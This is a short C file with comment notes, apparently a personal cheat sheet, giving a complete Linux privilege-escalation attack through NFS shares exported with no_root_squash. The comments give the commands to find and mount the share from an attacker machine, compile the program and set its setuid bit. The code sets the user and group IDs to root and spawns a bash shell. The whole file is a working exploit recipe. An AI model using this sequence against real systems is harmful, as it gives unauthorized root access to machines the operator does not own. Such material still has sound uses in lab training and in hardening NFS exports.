// find if there are shares on a remote Linux sys which is vulnerable to being mounted to attacker folder locally (indicative with no_root_squash for NFS):  cat /etc/exports
// create a folder locally on attacker sys and proceed to mount vulnerable share with read/write perms: mount -o rw,vers=2 [vulnerable machine IP:/file_path] /attacker/local/file_path
//make sure there is no space after the 'rw,'
//check from attacker machine that share is mounted succesfully : mount



//create following C file in attacker's mounted share, that will spawn a bash shall  when executed : 
//echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /attacker/local/file_path/yourbadfile.c
//make sure there is no space after the 'rw,'
int main() {
    // Set the group ID and user ID to 0 (root)
    setgid(0);
    setuid(0);
    // Execute a new bash shell with root privileges
    system("/bin/bash");
    // Return 0 indicating successful execution
    return 0;
}
// compile the C file: gcc /attacker/local/file_path/yourbadfile.c -o /attacker/local/file_path/yourbadfile
// be sure to specifcy absolute path for gcc to compile without input errors
// change file permissions: chmod +s
// execute yourbadfile on vulnerable machine
